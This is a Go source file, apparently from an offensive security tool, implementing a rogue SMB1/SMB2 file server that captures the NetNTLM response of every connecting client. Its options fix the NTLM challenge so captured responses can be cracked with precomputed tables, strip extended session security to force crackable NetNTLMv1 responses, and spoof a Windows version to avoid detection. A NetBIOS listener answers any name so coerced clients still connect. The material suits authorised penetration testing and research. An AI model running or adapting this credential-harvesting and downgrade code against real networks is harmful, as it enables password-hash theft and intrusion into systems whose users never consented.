package server

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/TheManticoreProject/Manticore/crypto/spnego"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/version"
	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/smb/common/transport"
	smb1message "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message"
	smb1commands "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands"
	smb1codes "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands/codes"
	smb1 "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/server"
	"github.com/TheManticoreProject/Manticore/network/smb/smb_v10/server/rpcpipe"
	smb2 "github.com/TheManticoreProject/Manticore/network/smb/smb_v20/server"
)

// ShareSpec is one disk share to serve: a name clients connect to and the local
// directory behind it.
type ShareSpec struct {
	Name string
	Path string
}

// Options configures a Server.
type Options struct {
	// Shares are the disk shares served, in order; the first is the one named in
	// logs. At least one is required.
	Shares   []ShareSpec
	ReadOnly bool

	ListenAddress string
	// TCPPort is the direct-TCP (445) listener's port; 0 disables it. NBTPort is
	// the NetBIOS-over-TCP (139) listener's port; 0 disables it. At least one must
	// be set. A real server is reachable on both, since Windows falls back to 139.
	TCPPort    int
	NBTPort    int
	ServerName string
	Domain     string

	// Account is the account served. Nil admits every logon as a guest, which is
	// what a capture wants.
	Account *smb1.Account

	RequireSigning    bool
	RequireEncryption bool

	// Challenge fixes the 8-byte NTLM server challenge instead of drawing a fresh
	// random one per logon. A fixed challenge lets a captured NetNTLM response be
	// cracked against a precomputed table (e.g. crack.sh for NetNTLMv1). Nil keeps
	// a fresh random challenge, which is the safe default.
	Challenge *[8]byte

	// DisableESS strips extended session security from the CHALLENGE, so an
	// NTLMv1-capable client answers with a plain NetNTLMv1 response that crack.sh
	// can resolve to the NT hash. Pair it with a fixed Challenge. A client that
	// computes NTLMv2 is unaffected.
	DisableESS bool

	// AdvertiseVersion, when set, is the Windows version announced in the NTLM
	// CHALLENGE. A real Windows host always sends one; omitting it (nil) is a tell
	// that the server is synthetic.
	AdvertiseVersion *version.Version

	// Browsable serves an IPC$ share answering srvsvc/wkssvc over SMB1, so a
	// client can list the share with `net view`, `smbclient -L` or Explorer.
	Browsable bool

	// LogFileAccess logs every file a client opens (who, path, read or write), so
	// a payload pulled from the share or a file dropped on it is recorded.
	LogFileAccess bool

	EnableSMB1 bool
	EnableSMB2 bool

	OutputFile string
}

// Server serves shares over SMB1 and SMB2/3 on one or more listeners, routing
// each connection on its first NEGOTIATE, and harvests the NetNTLM response of
// every logon on both protocols.
type Server struct {
	options Options
	smb1    *smb1.Server
	smb2    *smb2.Server

	capture *smb2.CaptureHandler

	mu        sync.Mutex
	listeners []transport.Listener
	closed    bool
}

// NewServer builds the SMB1 and SMB2 servers the options enable.
func NewServer(options Options) (*Server, error) {
	if !options.EnableSMB1 && !options.EnableSMB2 {
		return nil, fmt.Errorf("at least one of SMB1 and SMB2 must be enabled")
	}
	if options.RequireEncryption && options.EnableSMB1 {
		return nil, fmt.Errorf("SMB1 has no encryption, disable it to require encryption")
	}
	if options.Account == nil && (options.RequireSigning || options.RequireEncryption) {
		return nil, fmt.Errorf("--require-signing and --require-encryption need an account (-u): a guest session derives no key to sign or encrypt with")
	}

	if len(options.Shares) == 0 {
		return nil, fmt.Errorf("at least one share is required")
	}

	// One capture handler for both protocols, so the output file and the
	// per-user deduplication are shared. Known accounts are still served
	// (pass-through); the rest fall to the guest or logon-failure policy.
	capture, err := smb2.NewCaptureHandler(smb2.CaptureConfig{
		CaptureConfig: smb1.CaptureConfig{OutputFile: options.OutputFile, UniquePerUser: true},
		PassThrough:   true,
	})
	if err != nil {
		return nil, err
	}

	var authenticator func(domain, username string) ([16]byte, bool)
	if options.Account != nil {
		account := *options.Account
		// Match on the username only, ignoring the domain the client claims: the NT
		// hash does not depend on the domain, so a client that guesses the wrong
		// domain is still served. The configured domain stays display-only.
		authenticator = func(_, username string) ([16]byte, bool) {
			if strings.EqualFold(username, account.Username) {
				return account.NTHash, true
			}
			return [16]byte{}, false
		}
	}
	guest := options.Account == nil

	// onAccept steers each NTLM exchange — a fixed challenge, an advertised
	// version — and is set on both protocols so a captured response and the
	// server's fingerprint are identical whichever a client speaks.
	var onAccept func(*spnego.AcceptContext)
	switch {
	case options.DisableESS:
		// Own the whole CHALLENGE so extended session security can be stripped;
		// the fixed challenge and advertised version fold into it.
		targetName, fixed, advertiseVersion := options.Domain, options.Challenge, options.AdvertiseVersion
		onAccept = func(accept *spnego.AcceptContext) {
			accept.ChallengeProvider = func(negotiateBytes []byte) ([]byte, error) {
				return downgradeChallenge(negotiateBytes, targetName, fixed, advertiseVersion)
			}
		}
	case options.Challenge != nil || options.AdvertiseVersion != nil:
		fixed, advertiseVersion := options.Challenge, options.AdvertiseVersion
		onAccept = func(accept *spnego.AcceptContext) {
			if fixed != nil {
				accept.ServerChallenge = *fixed
			}
			if advertiseVersion != nil {
				accept.Version = advertiseVersion
			}
		}
	}

	s := &Server{options: options, capture: capture}
	if options.EnableSMB1 {
		signing := smb1.SigningEnabled
		if options.RequireSigning {
			signing = smb1.SigningRequired
		}
		s.smb1, err = smb1.NewServer(smb1.Config{
			ServerName:      options.ServerName,
			DomainName:      options.Domain,
			DNSComputerName: options.ServerName,
			DNSDomainName:   options.Domain,
			Authenticator:   authenticator,
			AllowGuest:      guest,
			AllowAnonymous:  guest,
			SigningPolicy:   signing,
			OnAcceptContext: onAccept,
		})
		if err != nil {
			return nil, err
		}
		s.smb1.RegisterHandler(passThroughCapture(capture.CaptureHandler))
		if options.LogFileAccess {
			s.smb1.RegisterHandler(logSMB1FileAccess())
		}
		if options.Browsable {
			// An IPC$ share answering srvsvc/wkssvc is what a client lists shares
			// over; the SMB2 server has no pipe stack, so browsing is SMB1-only.
			ipc := &smb1.Share{
				Name:  "IPC$",
				Type:  smb1.ShareTypeNamedPipe,
				Pipes: rpcpipe.ForServer(s.smb1, rpcpipe.Options{ServerName: options.ServerName, DomainName: options.Domain}),
			}
			if err := s.smb1.AddShare(ipc); err != nil {
				return nil, err
			}
		}
	}
	if options.EnableSMB2 {
		s.smb2, err = smb2.NewServer(smb2.Config{
			ServerName:        options.ServerName,
			DomainName:        options.Domain,
			DNSComputerName:   options.ServerName,
			DNSDomainName:     options.Domain,
			Authenticator:     authenticator,
			AllowGuest:        guest,
			AllowAnonymous:    guest,
			RequireSigning:    options.RequireSigning,
			RequireEncryption: options.RequireEncryption,
			OnAcceptContext:   onAccept,
		})
		if err != nil {
			return nil, err
		}
		if options.LogFileAccess {
			s.smb2.RegisterHandler(logSMB2FileAccess())
		}
		s.smb2.RegisterHandler(capture)
	}

	// Each share's backend is built once and wrapped by both protocols, so file
	// contents stay consistent. Open state (share modes, oplocks) is tracked per
	// server and does not cross protocols — unusual in practice, and Manticore
	// keeps the two Share types apart, so they are left separate.
	for _, spec := range options.Shares {
		fs, err := smb1.NewLocalFileSystem(spec.Path, spec.Name)
		if err != nil {
			return nil, err
		}
		fs.SetReadOnly(options.ReadOnly)
		if s.smb1 != nil {
			if err := s.smb1.AddShare(&smb1.Share{Name: spec.Name, Type: smb1.ShareTypeDisk, FS: fs, ReadOnly: options.ReadOnly}); err != nil {
				return nil, err
			}
		}
		if s.smb2 != nil {
			if err := s.smb2.AddShare(&smb2.Share{Name: spec.Name, FS: fs, ReadOnly: options.ReadOnly}); err != nil {
				return nil, err
			}
		}
	}
	return s, nil
}

// ListenAndServe binds the configured listeners (direct TCP and/or NetBIOS) and
// serves them until one fails or Close is called.
func (s *Server) ListenAndServe() error {
	var listeners []transport.Listener
	if s.options.TCPPort > 0 {
		l, err := transport.ListenTCP(net.JoinHostPort(s.options.ListenAddress, strconv.Itoa(s.options.TCPPort)))
		if err != nil {
			return err
		}
		listeners = append(listeners, l)
	}
	if s.options.NBTPort > 0 {
		// nil answers to any CALLED name, so a client coerced to \\anything\share
		// over NetBIOS still reaches the server.
		l, err := transport.ListenNBT(net.JoinHostPort(s.options.ListenAddress, strconv.Itoa(s.options.NBTPort)), nil)
		if err != nil {
			closeAll(listeners)
			return err
		}
		listeners = append(listeners, l)
	}
	if len(listeners) == 0 {
		return fmt.Errorf("no listener enabled: set a TCP or NBT port")
	}

	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		closeAll(listeners)
		return nil
	}
	s.listeners = listeners
	s.mu.Unlock()

	addrs := make([]string, len(listeners))
	for i, l := range listeners {
		addrs[i] = l.Addr().String()
	}
	logger.Infof("Serving %s on %s as \\\\%s (%s)", s.shareList(), strings.Join(addrs, ", "), s.options.ServerName, s.protocols())

	// Accept on every listener; the first to fail returns, and the rest are
	// closed on the way out. A Close-triggered failure reports no error.
	errCh := make(chan error, len(listeners))
	for _, l := range listeners {
		go func(l transport.Listener) {
			for {
				t, remote, err := l.Accept()
				if err != nil {
					errCh <- err
					return
				}
				go s.serveConn(t, remote)
			}
		}(l)
	}

	err := <-errCh
	if s.isClosed() {
		return nil
	}
	s.Close()
	return fmt.Errorf("failed to accept an SMB connection: %v", err)
}

// Close stops the listeners and tears down the sub-servers and their live
// connections. It is safe to call more than once and from any goroutine.
func (s *Server) Close() {
	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		return
	}
	s.closed = true
	listeners := s.listeners
	s.listeners = nil
	s.mu.Unlock()

	closeAll(listeners)
	if s.smb1 != nil {
		s.smb1.Close()
	}
	if s.smb2 != nil {
		s.smb2.Close()
	}
}

func (s *Server) isClosed() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.closed
}

// Captured returns the NTLM responses harvested so far, one per user.
func (s *Server) Captured() []smb1.Credential {
	if s.capture == nil {
		return nil
	}
	return s.capture.Credentials()
}

func closeAll(listeners []transport.Listener) {
	for _, l := range listeners {
		l.Close()
	}
}

// serveConn hands a connection to the server its first frame calls for.
func (s *Server) serveConn(t transport.Transport, remote net.Addr) {
	var err error
	switch {
	case s.smb2 == nil:
		err = s.smb1.ServeConn(t, remote)
	case s.smb1 == nil:
		err = s.smb2.ServeConn(t, remote)
	default:
		// Bound the wait for the first frame, as each sub-server bounds its own
		// handshake: without it a client that connects and stays silent holds a
		// goroutine for good, because neither sub-server has seen the connection
		// yet to time it out. Cleared once the frame is in, so the chosen
		// sub-server applies its own read timeouts.
		t.SetTimeout(smb2.DefaultHandshakeTimeout)
		var first []byte
		if first, err = t.Receive(); err != nil {
			t.Close()
			break
		}
		t.SetTimeout(0)
		replay := &replayTransport{Transport: t, first: first}
		protocol := route(first)
		logger.Debugf("Serving %s over %s", remote, protocol)
		if protocol == SMB1 {
			err = s.smb1.ServeConn(replay, remote)
		} else {
			err = s.smb2.ServeConn(replay, remote)
		}
	}
	if err != nil {
		logger.Debugf("Refusing %s: %v", remote, err)
	}
}

func (s *Server) protocols() string {
	switch {
	case s.smb1 == nil:
		return "SMB 2/3"
	case s.smb2 == nil:
		return "SMB1"
	}
	return "SMB1, SMB 2/3"
}

// shareList renders the served shares as "NAME=PATH, NAME=PATH" for the startup log.
func (s *Server) shareList() string {
	parts := make([]string, len(s.options.Shares))
	for i, spec := range s.options.Shares {
		parts[i] = spec.Name + "=" + spec.Path
	}
	return strings.Join(parts, ", ")
}

// passThroughCapture records the AUTHENTICATE leg of an SMB1 session setup and
// lets the logon proceed, as the SMB2 capture handler does with PassThrough;
// the SMB1 capture handler alone always refuses it.
func passThroughCapture(capture *smb1.CaptureHandler) smb1.Handler {
	return smb1.HandlerFunc(func(srv *smb1.Server, conn *smb1.Connection, w smb1.ResponseWriter, req *smb1message.Message) bool {
		if req.Header.Command != smb1codes.SMB_COM_SESSION_SETUP_ANDX {
			return false
		}
		accept := conn.PendingAuth(uint16(req.Header.UID))
		request, ok := req.Command.(*smb1commands.SessionSetupAndxRequest)
		if accept == nil || !ok || len(request.SecurityBlob) == 0 || accept.AcceptAuthenticateToken([]byte(request.SecurityBlob)) != nil {
			return false
		}
		capture.Record(conn.Remote, accept)
		return false
	})
}
